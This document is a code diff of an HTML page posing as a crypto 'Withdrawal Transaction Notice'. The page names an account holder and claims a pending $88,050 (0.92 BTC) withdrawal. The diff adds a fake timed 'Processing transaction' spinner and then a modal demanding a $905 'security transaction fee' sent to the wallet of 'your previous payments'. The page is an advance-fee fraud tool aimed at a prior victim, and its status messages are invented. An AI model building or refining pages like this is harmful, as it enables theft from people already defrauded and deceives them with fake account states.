@@ -5,42 +5,22 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Withdrawal Transaction Notice</title>
 
-  <!-- Inter Font -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
   <style>
-    * {
-      box-sizing: border-box;
-      font-family: 'Inter', sans-serif;
-    }
+    * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
 
-    body {
-      margin: 0;
-      background: #ffffff;
-      color: #1f2937;
-    }
+    body { margin: 0; background: #ffffff; color: #1f2937; }
 
-    /* Header */
     .header {
-      background: linear-gradient(
-        135deg,
-        #0b6fbf 0%,
-        #1e8bd6 50%,
-        #0b6fbf 100%
-      );
+      background: linear-gradient(135deg, #0b6fbf 0%, #1e8bd6 50%, #0b6fbf 100%);
       padding: 26px 20px;
       text-align: center;
       color: #ffffff;
     }
 
-    .header h1 {
-      margin: 0;
-      font-size: 28px;
-      font-weight: 600;
-      letter-spacing: 0.2px;
-    }
+    .header h1 { margin: 0; font-size: 28px; font-weight: 600; }
 
-    /* Content */
     .content {
       max-width: 960px;
       margin: 0 auto;
@@ -55,10 +35,7 @@
       font-size: 15px;
     }
 
-    .label {
-      color: #374151;
-      min-width: 180px;
-    }
+    .label { min-width: 180px; color: #374151; }
 
     .value {
       font-weight: 600;
@@ -68,11 +45,7 @@
       flex-wrap: wrap;
     }
 
-    .divider {
-      height: 1px;
-      background: #e5e7eb;
-      margin: 24px 0;
-    }
+    .divider { height: 1px; background: #e5e7eb; margin: 24px 0; }
 
     .badge {
       padding: 6px 14px;
@@ -81,37 +54,15 @@
       font-weight: 600;
     }
 
-    .badge-warning {
-      background: #fff3cd;
-      color: #7a5b00;
-    }
+    .badge-warning { background: #fff3cd; color: #7a5b00; }
+    .badge-error { background: #f8d7da; color: #842029; }
 
-    .badge-error {
-      background: #f8d7da;
-      color: #842029;
-    }
+    .description { font-size: 15px; line-height: 1.7; color: #374151; margin-bottom: 20px; }
 
-    .description {
-      font-size: 15px;
-      line-height: 1.7;
-      color: #374151;
-      margin-bottom: 20px;
-    }
+    .required-title { font-weight: 600; margin-top: 30px; margin-bottom: 12px; }
+    .required-action { font-size: 15px; margin-bottom: 40px; }
 
-    .required-title {
-      font-weight: 600;
-      margin-top: 30px;
-      margin-bottom: 12px;
-    }
-
-    .required-action {
-      font-size: 15px;
-      margin-bottom: 40px;
-    }
-
-    .btn-wrapper {
-      text-align: center;
-    }
+    .btn-wrapper { text-align: center; }
 
     .btn {
       background: linear-gradient(180deg, #1f7ed8, #0b5fb3);
@@ -131,88 +82,173 @@
     }
 
     @media (max-width: 600px) {
-      .row {
-        flex-direction: column;
-        align-items: flex-start;
-      }
+      .row { flex-direction: column; align-items: flex-start; }
+      .label { min-width: unset; }
+      .header h1 { font-size: 22px; }
+    }
 
-      .label {
-        min-width: unset;
-      }
+    /* ===== FULL PAGE LOADER ===== */
+    .loader-overlay {
+      position: fixed;
+      inset: 0;
+      background: #0b102e;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      flex-direction: column;
+      color: #ffffff;
+    }
 
-      .header h1 {
-        font-size: 22px;
-      }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid rgba(255,255,255,0.2);
+      border-top: 6px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ===== MODAL ===== */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .modal {
+      background: linear-gradient(180deg, #141a3a, #0d1026);
+      color: #ffffff;
+      border-radius: 16px;
+      padding: 28px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .qr-box {
+      background: #ffffff;
+      padding: 16px;
+      border-radius: 12px;
+      margin: 18px auto;
+      width: fit-content;
+    }
+
+    .wallet-box {
+      background: rgba(255,255,255,0.08);
+      padding: 12px;
+      border-radius: 10px;
+      font-size: 14px;
+      word-break: break-all;
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .copy-btn {
+      background: #2563eb;
+      border: none;
+      color: #ffffff;
+      padding: 6px 10px;
+      border-radius: 6px;
+      font-size: 13px;
+      cursor: pointer;
+    }
+
+    .modal-close {
+      margin-top: 18px;
+      background: transparent;
+      border: 1px solid rgba(255,255,255,0.3);
+      color: #ffffff;
+      padding: 10px 22px;
+      border-radius: 8px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
 
-  <div class="header">
-    <h1>Withdrawal Transaction Notice</h1>
+<div class="header">
+  <h1>Withdrawal Transaction Notice</h1>
+</div>
+
+<div class="content">
+  <div class="row"><div class="label">Account Holder:</div><div class="value">Mauricio De la Torre</div></div>
+  <div class="row"><div class="label">Transaction Category:</div><div class="value">Withdrawal</div></div>
+
+  <div class="divider"></div>
+
+  <div class="row"><div class="label">Current State:</div><span class="badge badge-warning">Pending — User Action Required</span></div>
+  <div class="row"><div class="label">System Flag:</div><span class="badge badge-error">Incomplete Process Detected</span></div>
+
+  <div class="row">
+    <div class="label">Withdrawal Amount:</div>
+    <div class="value"><span>$88,050.00</span><span>(0.92 BTC)</span></div>
   </div>
 
-  <div class="content">
+  <div class="divider"></div>
 
-    <div class="row">
-      <div class="label">Account Holder:</div>
-      <div class="value">Mauricio De la Torre</div>
-    </div>
+  <div class="description">The previously initiated withdrawal was not finalized due to an incomplete authorization step or a temporary system interruption.</div>
+  <div class="description">To resume processing, the withdrawal must be <strong>re-initiated using the alternative withdrawal method</strong> available on your account.</div>
+  <div class="description">No funds have been released at this stage.</div>
 
-    <div class="row">
-      <div class="label">Transaction Category:</div>
-      <div class="value">Withdrawal</div>
-    </div>
+  <div class="divider"></div>
 
-    <div class="divider"></div>
+  <div class="required-title">Required Action:</div>
+  <div class="required-action">▶ Resume and finalize the withdrawal process below.</div>
 
-    <div class="row">
-      <div class="label">Current State:</div>
-      <span class="badge badge-warning">Pending — User Action Required</span>
-    </div>
-
-    <div class="row">
-      <div class="label">System Flag:</div>
-      <span class="badge badge-error">Incomplete Process Detected</span>
-    </div>
-
-    <!-- Amount -->
-    <div class="row">
-      <div class="label">Withdrawal Amount:</div>
-      <div class="value">
-        <span>$88,050.00</span>
-        <span>(0.92 BTC)</span>
-      </div>
-    </div>
-
-    <div class="divider"></div>
-
-    <div class="description">
-      The previously initiated withdrawal was not finalized due to an incomplete authorization
-      step or a temporary system interruption.
-    </div>
-
-    <div class="description">
-      To resume processing, the withdrawal must be <strong>re-initiated using the alternative
-      withdrawal method</strong> available on your account.
-    </div>
-
-    <div class="description">
-      No funds have been released at this stage.
-    </div>
-
-    <div class="divider"></div>
-
-    <div class="required-title">Required Action:</div>
-    <div class="required-action">
-      ▶ Resume and finalize the withdrawal process below.
-    </div>
-
-    <div class="btn-wrapper">
-      <button class="btn">Complete Transaction</button>
-    </div>
-
+  <div class="btn-wrapper">
+    <button class="btn" onclick="startProcess()">Complete Transaction</button>
   </div>
+</div>
+
+<!-- LOADER -->
+<div class="loader-overlay" id="loader">
+  <div class="spinner"></div>
+  <div>Processing transaction…</div>
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="securityModal">
+  <div class="modal">
+    <h2>Security Transaction Fee</h2>
+    <p>
+      To complete the transaction, a security transaction fee of
+      <strong>$905</strong> is required.
+      Please deposit the amount to the wallet address of your previous payments to proceed.
+    </p>
+
+    <button class="modal-close" onclick="closeModal()">OK</button>
+  </div>
+</div>
+
+<script>
+  function startProcess() {
+    document.getElementById('loader').style.display = 'flex';
+    setTimeout(() => {
+      document.getElementById('loader').style.display = 'none';
+      document.getElementById('securityModal').style.display = 'flex';
+    }, 5000);
+  }
+
+  function closeModal() {
+    document.getElementById('securityModal').style.display = 'none';
+  }
+
+  function copyWallet() {
+    navigator.clipboard.writeText(document.getElementById('walletAddress').innerText);
+  }
+</script>
 
 </body>
 </html>
